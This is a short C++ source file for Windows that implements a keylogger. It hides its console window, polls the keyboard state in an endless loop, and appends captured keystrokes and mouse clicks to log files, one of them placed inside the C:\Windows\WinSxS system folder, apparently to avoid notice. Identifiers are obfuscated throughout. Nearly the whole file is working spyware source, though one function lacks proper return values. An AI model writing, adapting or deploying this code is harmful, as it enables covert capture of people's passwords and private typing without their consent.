#include <windows.h>
#include <fstream>
#include <string>
using namespace std;


void b7wke7nsehsk(LPCSTR pp29a7f3wds) {
	ofstream asi7gubj7wgubje;
	asi7gubj7wgubje.open("ap37wgufesbkjd.0", fstream::app);
	asi7gubj7wgubje << pp29a7f3wds;
	asi7gubj7wgubje.close();
}

bool oa83wyehulwyf(int iKey) {
	switch (iKey) {
	case VK_SPACE:
		b7wke7nsehsk(" ");
		break;
	case VK_RETURN:
		b7wke7nsehsk("\n");
		break;
	case VK_SHIFT:
		b7wke7nsehsk(" *shift* ");
		break;
	case VK_BACK:
		b7wke7nsehsk("\b");
		break;
	case VK_RBUTTON:
		b7wke7nsehsk(" *rmouse* ");
		break;
	case VK_LBUTTON:
		b7wke7nsehsk(" *lmouse* ");
		break;
	default: return false;
	}
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
		LPSTR pCmdLine, int nCmdShow) {

	HWND hide; 
	AllocConsole(); 
	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);

	char l2p8hsljls;
	while (true) {
		Sleep(10);
		for (l2p8hsljls = 8; l2p8hsljls <= 190; l2p8hsljls++) {
			if (GetAsyncKeyState(l2p8hsljls) == -32767) {
				if (oa83wyehulwyf(l2p8hsljls) == false) {
					ofstream asi7gubj7wgubje;
					asi7gubj7wgubje.open("C:\\Windows\\WinSxS\\ap37wgufesbkjd.0", fstream::app);
					asi7gubj7wgubje << l2p8hsljls;
					asi7gubj7wgubje.close();
				}
			}
		}
	}

}